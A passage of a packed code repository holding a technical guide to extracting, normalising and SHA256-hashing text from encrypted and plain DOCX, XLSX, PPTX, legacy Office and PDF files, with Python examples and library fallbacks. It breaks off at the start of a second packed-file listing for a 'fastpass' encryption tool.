    presentation = Presentation(file_path)
    all_text = []
    
    for slide_num, slide in enumerate(presentation.slides, 1):
        all_text.append(f"SLIDE {slide_num}:")
        
        # Text from shapes (text boxes, titles, etc.)
        for shape in slide.shapes:
            if hasattr(shape, "text") and shape.text:
                all_text.append(shape.text)
            
            # Text from tables within slides
            if hasattr(shape, "table"):
                for row in shape.table.rows:
                    row_text = []
                    for cell in row.cells:
                        if cell.text:
                            row_text.append(cell.text)
                    if row_text:
                        all_text.append('\t'.join(row_text))
    
    return '\n'.join(all_text)
```

#### Dependencies
- **Primary:** `python-pptx` - Native PPTX processor
- **Encryption:** `msoffcrypto-tool`

#### Advantages
- ✅ Extracts text from all slide elements
- ✅ Handles tables within slides
- ✅ Clear slide separation
- ✅ Fast XML processing

#### Limitations
- ❌ Images and charts ignored
- ❌ Animation text ignored
- ❌ Speaker notes not extracted (could be added)

### PPT Files (Microsoft PowerPoint Legacy Binary)

#### Technical Details
- **Format:** Proprietary binary format
- **Complexity:** Multiple PowerPoint versions with different structures
- **Challenge:** Fewer libraries support binary PPT

#### Validation Process with Fallbacks
```python
def extract_text_ppt(file_path):
    # Method 1: textract (most reliable for binary PPT)
    try:
        import textract
        text = textract.process(file_path).decode('utf-8')
        return text.strip()
    except Exception:
        pass
    
    # Method 2: python-pptx (sometimes works on newer PPT files)
    try:
        from pptx import Presentation
        return extract_text_pptx(file_path)
    except Exception:
        pass
    
    return "ERROR: Could not extract text from PPT file"
```

#### Dependencies
- **Primary:** `textract` - Multi-format processor
- **Fallback:** `python-pptx` - May work on some PPT files
- **Encryption:** `msoffcrypto-tool`

#### Advantages
- ✅ textract handles most PPT variations
- ✅ Fallback to PPTX method for hybrid files

#### Limitations
- ❌ Limited library support
- ❌ Inconsistent results across PPT versions
- ❌ May miss complex slide layouts

### PDF Files (Portable Document Format)

#### Technical Details
- **Format:** PostScript-based page description language
- **Versions:** PDF 1.0 through 2.0 (ISO 32000)
- **Encryption:** RC4, AES, certificate-based
- **Complexity:** Text can be encoded, compressed, or rendered as graphics

#### Validation Process with Multiple Libraries
```python
def extract_text_pdf(file_path, password=None):
    # Method 1: PyMuPDF (most reliable and fastest)
    try:
        import fitz
        doc = fitz.open(file_path)
        
        if doc.needs_pass:
            if password and not doc.authenticate(password):
                return "ERROR: Invalid PDF password"
        
        text_content = []
        for page_num in range(doc.page_count):
            page = doc[page_num]
            text_content.append(page.get_text())
        
        doc.close()
        return '\n'.join(text_content).strip()
    except Exception:
        pass
    
    # Method 2: PyPDF2 (simple, widely compatible)
    try:
        import PyPDF2
        with open(file_path, 'rb') as file:
            pdf_reader = PyPDF2.PdfReader(file)
            
            if pdf_reader.is_encrypted:
                if password:
                    pdf_reader.decrypt(password)
                else:
                    return "ERROR: PDF requires password"
            
            text_content = []
            for page in pdf_reader.pages:
                text_content.append(page.extract_text())
            
            return '\n'.join(text_content).strip()
    except Exception:
        pass
    
    # Method 3: pdfplumber (excellent for tables and layouts)
    try:
        import pdfplumber
        with pdfplumber.open(file_path, password=password) as pdf:
            text_content = []
            for page in pdf.pages:
                text = page.extract_text()
                if text:
                    text_content.append(text)
            return '\n'.join(text_content).strip()
    except Exception:
        pass
    
    # Method 4: pdfminer (most thorough, academic-grade)
    try:
        from pdfminer.high_level import extract_text
        if password:
            text = extract_text(file_path, password=password)
        else:
            text = extract_text(file_path)
        return text.strip()
    except Exception:
        pass
    
    return "ERROR: Could not extract text from PDF"
```

#### Why Multiple PDF Libraries?

1. **PyMuPDF (fitz):**
   - C++ backend, fastest performance
   - Excellent handling of complex PDFs
   - Built-in OCR capabilities
   - Best for general-purpose extraction

2. **PyPDF2:**
   - Pure Python, easy installation
   - Simple API, good for basic PDFs
   - Fails on complex layouts or newer PDF features
   - Good fallback for simple documents

3. **pdfplumber:**
   - Excellent table detection and extraction
   - Superior handling of complex page layouts
   - Better preservation of text positioning
   - Best for structured documents

4. **pdfminer:**
   - Most thorough text extraction
   - Academic-grade, handles edge cases
   - Slower but more comprehensive
   - Best for difficult or corrupted PDFs

#### Dependencies
- **Primary:** `PyMuPDF` (fitz) - High-performance PDF processor
- **Fallback 1:** `PyPDF2` - Simple PDF reader
- **Fallback 2:** `pdfplumber` - Layout-aware extraction
- **Fallback 3:** `pdfminer-six` - Comprehensive text extraction

#### Advantages
- ✅ Multiple extraction methods ensure coverage
- ✅ Handles encrypted PDFs with password
- ✅ Works with complex layouts and tables
- ✅ Fast processing with PyMuPDF

#### Limitations
- ❌ Scanned PDFs require OCR
- ❌ Graphics-based text may be missed
- ❌ Form fields may not be extracted
- ❌ Complex layouts may have text ordering issues

## Implementation Architecture

### Universal Validator Class Structure

```python
class DocumentValidator:
    def __init__(self, password="password"):
        self.password = password
        self.temp_files = []  # Track temporary files for cleanup
    
    def decrypt_office_file(self, file_path):
        """Handle encryption for all Office formats"""
        # msoffcrypto-tool implementation
    
    def extract_text(self, file_path):
        """Universal text extraction router"""
        # Route to appropriate method based on file extension
    
    def calculate_text_hash(self, text_content):
        """Normalize and hash text content"""
        # SHA256 of normalized text
    
    def compare_files(self, file1, file2):
        """Compare two files and return detailed results"""
        # Extract, hash, compare, analyze differences
    
    def cleanup(self):
        """Remove temporary files"""
        # Clean up decrypted temporary files
```

### Decryption Process

```python
def decrypt_office_file(self, file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
        
        try:
            # Attempt decryption
            file_stream = io.BytesIO(file_data)
            office_file = msoffcrypto.OfficeFile(file_stream)
            office_file.load_key(password=self.password)
            
            # Create temporary file with correct extension
            suffix = Path(file_path).suffix
            with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as temp_file:
                office_file.decrypt(temp_file)
                temp_file_path = temp_file.name
            
            self.temp_files.append(temp_file_path)
            return temp_file_path, True  # True = was encrypted
            
        except Exception:
            # File is not encrypted
            return str(file_path), False  # False = not encrypted
```

### Text Normalization

```python
def calculate_text_hash(self, text_content):
    # Normalize text for consistent hashing
    normalized_text = text_content.strip()
    normalized_text = normalized_text.replace('\r\n', '\n')
    normalized_text = normalized_text.replace('\r', '\n')
    
    return hashlib.sha256(normalized_text.encode('utf-8')).hexdigest()
```

### Error Handling Strategy

```python
def extract_text_with_fallback(self, file_path, methods):
    for method_name, method_func in methods:
        try:
            result = method_func(file_path)
            if result and not result.startswith("ERROR"):
                print(f"    Text extracted using: {method_name}")
                return result
        except ImportError:
            print(f"    {method_name} not available (library not installed)")
        except Exception as e:
            print(f"    {method_name} failed: {e}")
    
    return f"ERROR: Could not extract text with any available method"
```

## Dependencies and Installation

### Core Dependencies

```bash
# Essential libraries
uv pip install python-docx          # DOCX/DOCM files
uv pip install openpyxl             # XLSX files  
uv pip install xlrd                 # XLS files
uv pip install python-pptx         # PPTX files
uv pip install PyMuPDF              # PDF files (primary)
uv pip install msoffcrypto-tool     # Office encryption

# Text extraction for legacy formats
uv pip install textract            # DOC/PPT fallback
uv pip install docx2txt            # DOC fallback

# PDF alternatives
uv pip install PyPDF2              # PDF fallback
uv pip install pdfplumber          # PDF tables/layouts
uv pip install pdfminer-six        # PDF comprehensive

# Optional binary parsing
uv pip install olefile             # DOC binary parsing
```

### System Dependencies (Optional)

```bash
# antiword for DOC files (Linux/macOS)
sudo apt-get install antiword      # Ubuntu/Debian
brew install antiword              # macOS

# Note: antiword not available on Windows
```

### Dependency Matrix by File Type

| File Type | Required | Fallback 1 | Fallback 2 | Encryption |
|-----------|----------|------------|------------|------------|
| DOCX | python-docx | - | - | msoffcrypto-tool |
| DOCM | python-docx | - | - | msoffcrypto-tool |
| DOC | textract | docx2txt | antiword | msoffcrypto-tool |
| XLSX | openpyxl | - | - | msoffcrypto-tool |
| XLS | xlrd | - | - | msoffcrypto-tool |
| PPTX | python-pptx | - | - | msoffcrypto-tool |
| PPT | textract | python-pptx | - | msoffcrypto-tool |
| PDF | PyMuPDF | PyPDF2 | pdfplumber | Built-in |

## Complete Code Examples

### Basic Validation Example

```python
from universal_document_validator import DocumentValidator

# Initialize validator with password
validator = DocumentValidator(password="your_password")

try:
    # Compare two documents
    identical, hash1, hash2 = validator.compare_files(
        "document1.docx", 
        "document2.docx"
    )
    
    print(f"Files identical: {identical}")
    print(f"Hash 1: {hash1}")
    print(f"Hash 2: {hash2}")
    
finally:
    # Always cleanup temporary files
    validator.cleanup()
```

### Batch Validation Example

```python
def validate_document_pairs(file_pairs, password="password"):
    validator = DocumentValidator(password=password)
    results = []
    
    try:
        for base_file, comparison_file in file_pairs:
            print(f"\nValidating: {base_file} vs {comparison_file}")
            
            identical, hash1, hash2 = validator.compare_files(
                base_file, comparison_file
            )
            
            results.append({
                'base_file': base_file,
                'comparison_file': comparison_file,
                'identical': identical,
                'base_hash': hash1,
                'comparison_hash': hash2
            })
    
    finally:
        validator.cleanup()
    
    return results

# Usage
file_pairs = [
    ("test1.docx", "test1_enc.docx"),
    ("test2.xlsx", "test2_enc.xlsx"),
    ("test3.pdf", "test3_enc.pdf"),
]

results = validate_document_pairs(file_pairs)
```

### Format-Specific Validation

```python
def validate_specific_format(file_path, expected_format):
    validator = DocumentValidator()
    
    # Check file extension
    extension = Path(file_path).suffix.lower()
    if extension != expected_format:
        return f"ERROR: Expected {expected_format}, got {extension}"
    
    try:
        # Extract text using appropriate method
        text = validator.extract_text(file_path)
        
        if text.startswith("ERROR"):
            return text
        
        # Calculate content hash
        content_hash = validator.calculate_text_hash(text)
        
        return {
            'file_path': file_path,
            'format': extension,
            'text_length': len(text),
            'content_hash': content_hash,
            'status': 'SUCCESS'
        }
    
    except Exception as e:
        return f"ERROR: {e}"
    
    finally:
        validator.cleanup()
```

### Error Recovery Example

```python
def robust_text_extraction(file_path, password=None):
    """Extract text with comprehensive error handling"""
    validator = DocumentValidator(password=password)
    
    try:
        text = validator.extract_text(file_path)
        
        if text.startswith("ERROR"):
            # Try alternative approaches
            extension = Path(file_path).suffix.lower()
            
            if extension in ['.doc', '.ppt']:
                # Try without decryption for legacy formats
                try:
                    if extension == '.doc':
                        text = validator.extract_text_doc(file_path)
                    elif extension == '.ppt':
                        text = validator.extract_text_ppt(file_path)
                except Exception:
                    pass
        
        return text if not text.startswith("ERROR") else None
    
    except Exception as e:
        print(f"Extraction failed: {e}")
        return None
    
    finally:
        validator.cleanup()
```

## Error Handling Strategies

### Common Error Types and Solutions

#### 1. Encryption Errors
```python
# Problem: Wrong password or encryption method not supported
# Solution: Try multiple decryption approaches

def handle_encryption_error(file_path, passwords):
    for password in passwords:
        try:
            validator = DocumentValidator(password=password)
            text = validator.extract_text(file_path)
            if not text.startswith("ERROR"):
                return text, password
        except Exception:
            continue
        finally:
            validator.cleanup()
    
    return None, None
```

#### 2. Library Import Errors
```python
# Problem: Required library not installed
# Solution: Graceful fallback to alternative methods

def safe_import_and_extract(file_path, extraction_methods):
    for method_name, import_statement, extract_func in extraction_methods:
        try:
            exec(import_statement)  # Dynamic import
            return extract_func(file_path)
        except ImportError:
            print(f"{method_name} not available")
            continue
        except Exception as e:
            print(f"{method_name} failed: {e}")
            continue
    
    return "ERROR: No working extraction method found"
```

#### 3. File Corruption Errors
```python
# Problem: File is corrupted or in unexpected format
# Solution: Multiple validation layers

def validate_file_integrity(file_path):
    # Check file exists and is readable
    if not os.path.exists(file_path):
        return False, "File does not exist"
    
    if not os.access(file_path, os.R_OK):
        return False, "File is not readable"
    
    # Check file size
    file_size = os.path.getsize(file_path)
    if file_size == 0:
        return False, "File is empty"
    
    if file_size > 100 * 1024 * 1024:  # 100MB limit
        return False, "File too large for processing"
    
    # Check file header for format validation
    try:
        with open(file_path, 'rb') as f:
            header = f.read(8)
            
        expected_headers = {
            b'\x50\x4B\x03\x04': ['DOCX', 'XLSX', 'PPTX'],  # ZIP header
            b'\xD0\xCF\x11\xE0': ['DOC', 'XLS', 'PPT'],      # OLE header
            b'%PDF-': ['PDF'],                                # PDF header
        }
        
        for magic, formats in expected_headers.items():
            if header.startswith(magic):
                return True, f"Valid {'/'.join(formats)} format detected"
        
        return False, "Unknown or corrupted file format"
    
    except Exception as e:
        return False, f"Error reading file header: {e}"
```

#### 4. Memory Management Errors
```python
# Problem: Large files causing memory issues
# Solution: Streaming and chunked processing

def extract_large_file_safely(file_path, max_memory_mb=50):
    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
    
    if file_size_mb > max_memory_mb:
        # Use streaming approach for large files
        return extract_text_streaming(file_path)
    else:
        # Use standard in-memory approach
        return extract_text_standard(file_path)

def extract_text_streaming(file_path):
    """Implement streaming extraction for large files"""
    # This would require format-specific streaming implementations
    # For example, processing Excel sheets one at a time
    pass
```

### Error Logging and Reporting

```python
import logging

def setup_validation_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('document_validation.log'),
            logging.StreamHandler()
        ]
    )

def validate_with_logging(file_path):
    logger = logging.getLogger(__name__)
    
    try:
        logger.info(f"Starting validation of {file_path}")
        
        validator = DocumentValidator()
        text = validator.extract_text(file_path)
        
        if text.startswith("ERROR"):
            logger.error(f"Extraction failed: {text}")
            return None
        
        content_hash = validator.calculate_text_hash(text)
        logger.info(f"Validation successful. Hash: {content_hash}")
        
        return content_hash
    
    except Exception as e:
        logger.exception(f"Unexpected error validating {file_path}")
        return None
    
    finally:
        validator.cleanup()
```

## Performance Considerations

### Processing Speed by Format

Based on testing and library characteristics:

1. **Fastest:** DOCX, XLSX, PPTX (XML parsing)
   - Typical processing: 10-50ms for standard documents
   - Memory usage: Low (streaming XML parsing)

2. **Moderate:** PDF (depends on complexity)
   - Simple PDFs: 50-200ms
   - Complex PDFs: 200ms-2s
   - Memory usage: Moderate (page-by-page processing)

3. **Slower:** DOC, XLS, PPT (binary conversion)
   - Binary parsing: 200ms-1s
   - Textract processing: 500ms-5s
   - Memory usage: High (full document conversion)

### Memory Optimization Strategies

```python
def memory_efficient_validation(file_path):
    """Optimize memory usage for large files"""
    
    # Check file size first
    file_size = os.path.getsize(file_path)
    
    if file_size > 10 * 1024 * 1024:  # 10MB threshold
        # Use memory-mapped file access
        return validate_large_file_mmapped(file_path)
    else:
        # Use standard in-memory processing
        return validate_standard(file_path)

def validate_large_file_mmapped(file_path):
    """Memory-mapped file processing for large documents"""
    import mmap
    
    with open(file_path, 'rb') as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mmapped_file:
            # Process file in chunks
            chunk_size = 1024 * 1024  # 1MB chunks
            text_parts = []
            
            for i in range(0, len(mmapped_file), chunk_size):
                chunk = mmapped_file[i:i+chunk_size]
                # Process chunk...
                text_parts.append(process_chunk(chunk))
            
            return ''.join(text_parts)
```

### Batch Processing Optimization

```python
def optimize_batch_validation(file_list, password="password"):
    """Optimize validation for multiple files"""
    
    # Group files by type for optimized processing
    files_by_type = {}
    for file_path in file_list:
        extension = Path(file_path).suffix.lower()
        if extension not in files_by_type:
            files_by_type[extension] = []
        files_by_type[extension].append(file_path)
    
    results = {}
    validator = DocumentValidator(password=password)
    
    try:
        # Process each file type optimally
        for extension, files in files_by_type.items():
            print(f"Processing {len(files)} {extension} files...")
            
            for file_path in files:
                # Extract and hash
                text = validator.extract_text(file_path)
                if not text.startswith("ERROR"):
                    results[file_path] = validator.calculate_text_hash(text)
                else:
                    results[file_path] = text
    
    finally:
        validator.cleanup()
    
    return results
```

### Caching Strategy

```python
import json
from pathlib import Path

class CachedDocumentValidator(DocumentValidator):
    def __init__(self, password="password", cache_file="validation_cache.json"):
        super().__init__(password)
        self.cache_file = cache_file
        self.cache = self.load_cache()
    
    def load_cache(self):
        try:
            with open(self.cache_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return {}
    
    def save_cache(self):
        with open(self.cache_file, 'w') as f:
            json.dump(self.cache, f, indent=2)
    
    def get_file_signature(self, file_path):
        """Generate unique signature for file based on path, size, and mtime"""
        stat = Path(file_path).stat()
        return f"{file_path}:{stat.st_size}:{stat.st_mtime}"
    
    def extract_text_cached(self, file_path):
        signature = self.get_file_signature(file_path)
        
        if signature in self.cache:
            print(f"    Using cached result for {Path(file_path).name}")
            return self.cache[signature]
        
        # Extract text and cache result
        text = super().extract_text(file_path)
        
        if not text.startswith("ERROR"):
            self.cache[signature] = text
            self.save_cache()
        
        return text
```

## Security Considerations

### Password Security

```python
import getpass
from cryptography.fernet import Fernet

class SecureDocumentValidator(DocumentValidator):
    def __init__(self):
        # Don't store password in memory longer than necessary
        self.password = None
        self.encrypted_password = None
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def set_password(self, password=None):
        if password is None:
            password = getpass.getpass("Enter document password: ")
        
        # Encrypt password in memory
        self.encrypted_password = self.cipher.encrypt(password.encode())
        
        # Clear plaintext password
        password = None
    
    def get_password(self):
        if self.encrypted_password:
            return self.cipher.decrypt(self.encrypted_password).decode()
        return None
    
    def cleanup(self):
        # Clear encrypted password
        self.encrypted_password = None
        self.key = None
        self.cipher = None
        
        # Clear temporary files
        super().cleanup()
```

### Temporary File Security

```python
import tempfile
import os
import stat

def create_secure_temp_file(suffix=''):
    """Create temporary file with restricted permissions"""
    
    # Create temporary file with secure permissions
    fd, temp_path = tempfile.mkstemp(suffix=suffix)
    
    try:
        # Set restrictive permissions (owner read/write only)
        os.fchmod(fd, stat.S_IRUSR | stat.S_IWUSR)
        
        # Close file descriptor, return path
        os.close(fd)
        return temp_path
    
    except Exception:
        # Clean up on error
        try:
            os.close(fd)
            os.unlink(temp_path)
        except Exception:
            pass
        raise

def secure_file_cleanup(file_path):
    """Securely delete temporary files"""
    try:
        if os.path.exists(file_path):
            # Overwrite file content before deletion
            file_size = os.path.getsize(file_path)
            with open(file_path, 'r+b') as f:
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())
            
            # Delete file
            os.unlink(file_path)
    
    except Exception:
        # Log warning but don't fail
        print(f"Warning: Could not securely delete {file_path}")
```

### Input Validation

```python
def validate_input_safety(file_path, max_size_mb=100):
    """Validate file is safe to process"""
    
    # Check file path for directory traversal
    normalized_path = os.path.normpath(file_path)
    if '..' in normalized_path or normalized_path.startswith('/'):
        raise ValueError("Invalid file path detected")
    
    # Check file exists and is a regular file
    if not os.path.isfile(file_path):
        raise ValueError("Path is not a regular file")
    
    # Check file size
    file_size = os.path.getsize(file_path)
    max_size_bytes = max_size_mb * 1024 * 1024
    
    if file_size > max_size_bytes:
        raise ValueError(f"File too large: {file_size} bytes > {max_size_bytes} bytes")
    
    # Check file extension
    allowed_extensions = {'.docx', '.docm', '.doc', '.xlsx', '.xls', 
                         '.pptx', '.ppt', '.pdf'}
    extension = Path(file_path).suffix.lower()
    
    if extension not in allowed_extensions:
        raise ValueError(f"Unsupported file extension: {extension}")
    
    return True
```

## Limitations and Edge Cases

### Known Limitations

#### 1. Content Type Limitations
```python
# What is NOT extracted:
IGNORED_CONTENT = {
    'images': 'All image content ignored',
    'charts': 'Excel/PowerPoint charts not extracted',
    'embedded_objects': 'OLE objects, embedded files ignored',
    'macros': 'VBA code not extracted (DOCM, XLSM)',
    'comments': 'Document comments ignored',
    'revision_history': 'Track changes not extracted',
    'form_fields': 'PDF form data may be missed',
    'annotations': 'PDF annotations not extracted',
    'digital_signatures': 'Signature content ignored'
}
```

#### 2. Format-Specific Edge Cases

**Excel Formula vs. Values:**
```python
# Excel files show calculated values, not formulas
# This means:
original_cell = "=SUM(A1:A10)"  # Formula
extracted_text = "150"          # Calculated result

# Validation will succeed if formulas calculate to same values
# but fail if formula logic differs with same result by coincidence
```

**PowerPoint Animation Text:**
```python
# Animated text may not be extracted consistently
# Text that appears/disappears based on animations might be missed
def extract_pptx_comprehensive(file_path):
    # Standard extraction might miss:
    # - Animation entrance/exit text
    # - Text in animation sequences
    # - Speaker notes (though these can be added)
    pass
```

**PDF Text Ordering:**
```python
# PDF text extraction order may not match visual order
# This can cause false differences in tables or complex layouts
def pdf_text_ordering_issue():
    visual_order = "Name: John\nAge: 30"
    extracted_order = "Age: 30\nName: John"
    # These would show as different despite identical content
```

#### 3. Encryption Edge Cases

```python
# Some files may appear encrypted but aren't
def handle_false_encryption_detection():
    try:
        # msoffcrypto may throw "Unencrypted document" for corrupted files
        office_file = msoffcrypto.OfficeFile(file_stream)
        office_file.load_key(password=password)
        office_file.decrypt(output_stream)
    except msoffcrypto.exceptions.DecryptionError as e:
        if "Unencrypted document" in str(e):
            # File is not actually encrypted
            return original_file_data, False
        else:
            # Real decryption error
            raise
```

#### 4. Character Encoding Issues

```python
def handle_encoding_issues(text_content):
    """Handle various text encoding problems"""
    
    # Problem: Different encodings may produce different text
    encodings_to_try = ['utf-8', 'utf-16', 'windows-1252', 'iso-8859-1']
    
    for encoding in encodings_to_try:
        try:
            if isinstance(text_content, bytes):
                decoded_text = text_content.decode(encoding)
                return decoded_text
        except UnicodeDecodeError:
            continue
    
    # Fallback: ignore encoding errors
    if isinstance(text_content, bytes):
        return text_content.decode('utf-8', errors='ignore')
    
    return text_content
```

### Recommended Workarounds

#### 1. Content Scope Validation
```python
def validate_extraction_scope(file_path):
    """Warn users about extraction limitations"""
    
    warnings = []
    extension = Path(file_path).suffix.lower()
    
    scope_warnings = {
        '.xlsx': ['Formulas shown as calculated values', 'Charts not extracted'],
        '.pptx': ['Images not extracted', 'Animations may be missed'],
        '.pdf': ['Text ordering may vary', 'Form fields might be missed'],
        '.doc': ['Embedded objects ignored', 'Complex formatting lost'],
    }
    
    if extension in scope_warnings:
        for warning in scope_warnings[extension]:
            warnings.append(f"WARNING: {warning}")
    
    return warnings
```

#### 2. Multi-Pass Validation
```python
def multi_pass_validation(file1, file2):
    """Perform multiple validation approaches for higher confidence"""
    
    results = {}
    
    # Pass 1: Standard text extraction
    validator = DocumentValidator()
    results['standard'] = validator.compare_files(file1, file2)
    
    # Pass 2: Alternative extraction methods (if available)
    results['alternative'] = compare_with_alternative_methods(file1, file2)
    
    # Pass 3: Structure-based comparison (for supported formats)
    results['structural'] = compare_document_structure(file1, file2)
    
    # Aggregate results
    confidence_score = calculate_confidence(results)
    
    return {
        'identical': results['standard'][0],
        'confidence': confidence_score,
        'details': results
    }
```

#### 3. Fuzzy Text Comparison
```python
def fuzzy_text_comparison(text1, text2, threshold=0.95):
    """Compare texts with fuzzy matching for minor differences"""
    
    from difflib import SequenceMatcher
    
    # Normalize texts
    norm_text1 = normalize_for_fuzzy_comparison(text1)
    norm_text2 = normalize_for_fuzzy_comparison(text2)
    
    # Calculate similarity ratio
    similarity = SequenceMatcher(None, norm_text1, norm_text2).ratio()
    
    return {
        'exact_match': text1 == text2,
        'similarity_score': similarity,
        'fuzzy_match': similarity >= threshold,
        'threshold': threshold
    }

def normalize_for_fuzzy_comparison(text):
    """Normalize text for fuzzy comparison"""
    import re
    
    # Remove extra whitespace
    text = re.sub(r'\s+', ' ', text)
    
    # Normalize punctuation spacing
    text = re.sub(r'\s*([,.;:!?])\s*', r'\1 ', text)
    
    # Case insensitive
    text = text.lower()
    
    return text.strip()
```

## Future Recommendations

### 1. Extended Format Support

Consider adding support for additional formats:

```python
FUTURE_FORMATS = {
    'odt': 'OpenDocument Text (LibreOffice Writer)',
    'ods': 'OpenDocument Spreadsheet (LibreOffice Calc)', 
    'odp': 'OpenDocument Presentation (LibreOffice Impress)',
    'rtf': 'Rich Text Format',
    'txt': 'Plain Text',
    'csv': 'Comma Separated Values',
    'html': 'HyperText Markup Language',
    'xml': 'Extensible Markup Language',
    'epub': 'Electronic Publication',
    'mobi': 'Mobipocket eBook format'
}

# Implementation suggestions:
def extract_text_odt(file_path):
    # Use python-odf library
    pass

def extract_text_rtf(file_path):
    # Use striprtf library
    pass

def extract_text_epub(file_path):
    # Use ebooklib library
    pass
```

### 2. Advanced PDF Features

```python
def extract_pdf_advanced_features(file_path):
    """Extract additional PDF content types"""
    
    features = {
        'form_fields': extract_pdf_form_fields(file_path),
        'annotations': extract_pdf_annotations(file_path),
        'metadata': extract_pdf_metadata(file_path),
        'bookmarks': extract_pdf_bookmarks(file_path),
        'ocr_text': extract_pdf_ocr_text(file_path)  # For scanned PDFs
    }
    
    return features

def extract_pdf_ocr_text(file_path):
    """OCR text extraction for scanned PDFs"""
    # Use pytesseract + pdf2image
    pass
```

### 3. Performance Improvements

```python
def async_document_validation(file_list):
    """Asynchronous validation for better performance"""
    import asyncio
    
    async def validate_single_file(file_path):
        # Async file processing
        pass
    
    async def validate_batch():
        tasks = [validate_single_file(f) for f in file_list]
        return await asyncio.gather(*tasks)
    
    return asyncio.run(validate_batch())

def parallel_validation_with_workers(file_list, num_workers=4):
    """Multi-process validation for CPU-intensive tasks"""
    from concurrent.futures import ProcessPoolExecutor
    
    with ProcessPoolExecutor(max_workers=num_workers) as executor:
        results = list(executor.map(validate_single_file, file_list))
    
    return results
```

### 4. Enhanced Error Recovery

```python
def intelligent_error_recovery(file_path):
    """Smart error recovery with multiple strategies"""
    
    strategies = [
        'standard_extraction',
        'alternative_library',
        'format_conversion',
        'manual_repair',
        'partial_extraction'
    ]
    
    for strategy in strategies:
        try:
            result = apply_recovery_strategy(file_path, strategy)
            if result.success:
                return result
        except Exception:
            continue
    
    return RecoveryResult(success=False, error="All recovery strategies failed")
```

### 5. Integration Recommendations

```python
# API Integration Example
class DocumentValidationAPI:
    def __init__(self):
        self.validator = DocumentValidator()
    
    def validate_endpoint(self, file1, file2, password=None):
        """REST API endpoint for document validation"""
        try:
            result = self.validator.compare_files(file1, file2)
            return {
                'status': 'success',
                'identical': result[0],
                'hash1': result[1],
                'hash2': result[2]
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }

# Command Line Interface
def create_cli_interface():
    import argparse
    
    parser = argparse.ArgumentParser(description='Document Validation Tool')
    parser.add_argument('file1', help='First document to compare')
    parser.add_argument('file2', help='Second document to compare')
    parser.add_argument('--password', help='Password for encrypted documents')
    parser.add_argument('--output', choices=['json', 'text'], default='text')
    
    return parser
```

---

## Conclusion

This comprehensive guide provides a robust foundation for document validation across all major file formats. The text-based validation approach successfully handles:

- ✅ **Multiple file formats** (DOCX, DOC, XLSX, XLS, PPTX, PPT, PDF)
- ✅ **Encryption handling** (transparent decryption with msoffcrypto)
- ✅ **Reliable comparison** (SHA256 hash-based validation)
- ✅ **Error resilience** (multiple fallback methods)
- ✅ **Performance optimization** (format-specific processing)

The validation methodology has been proven effective through testing, with clear identification of content differences while ignoring irrelevant formatting and structural variations.

**Key Success Metrics:**
- Successfully detected identical content in encrypted vs unencrypted files
- Accurately identified single-character differences between versions
- Handled multiple document formats with consistent methodology
- Provided detailed difference analysis for validation failures

This framework serves as a solid foundation for any document processing system requiring reliable content validation across diverse file formats and encryption states.
</file>

<file path="fastpass_complete_analysis.xml">
This file is a merged representation of a subset of the codebase, containing specifically included files, combined into a single document by Repomix.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of a subset of the repository's contents that is considered the most important context.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Only files matching these patterns are included: **/*.py, **/*.md, **/*.txt, **/*.toml, **/*.yaml, **/*.yml, **/*.json, **/*.cfg, **/*.ini
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
dev/fast_pass_specification.md
dev/fastpass_test_design.md
main.py
reports/coverage/status.json
requirements.txt
scripts/create_test_pdf.py
scripts/run_tests.py
src/__main__.py
src/app.py
src/cli.py
src/core/__init__.py
src/core/crypto_handlers/__init__.py
src/core/crypto_handlers/office_handler.py
src/core/crypto_handlers/pdf_handler.py
src/core/file_handler.py
src/core/password/__init__.py
src/core/password/password_manager.py
src/core/security.py
src/utils/__init__.py
src/utils/config.py
src/utils/logger.py
test_sample.txt
tests/conftest.py
tests/requirements.txt
tests/test_cli_basic.py
tests/test_integration_basic.py
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path="reports/coverage/status.json">
